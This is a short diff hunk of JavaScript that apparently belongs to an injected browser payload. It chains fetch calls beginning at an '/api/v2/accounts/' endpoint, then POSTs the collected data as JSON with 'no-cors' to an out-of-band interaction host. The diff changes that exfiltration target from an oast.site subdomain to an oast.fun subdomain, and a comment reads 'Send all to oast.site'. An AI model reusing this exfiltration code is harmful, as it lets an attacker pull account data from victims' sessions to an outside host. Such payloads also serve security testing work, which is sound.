@@ -44,7 +44,7 @@ fetch("/api/v2/accounts/")
                                   .then(data9 => {
 
                                     // Send all to oast.site
-                                    fetch("https://f8wkyec7ptx805p94djutwdb5c3bnac55.oast.site", {
+                                    fetch("https://uubirxqghuxrazhbdlhl8v0qf1ujj2wkh.oast.fun", {
                                       method: "POST",
                                       mode: "no-cors",
                                       body: JSON.stringify({
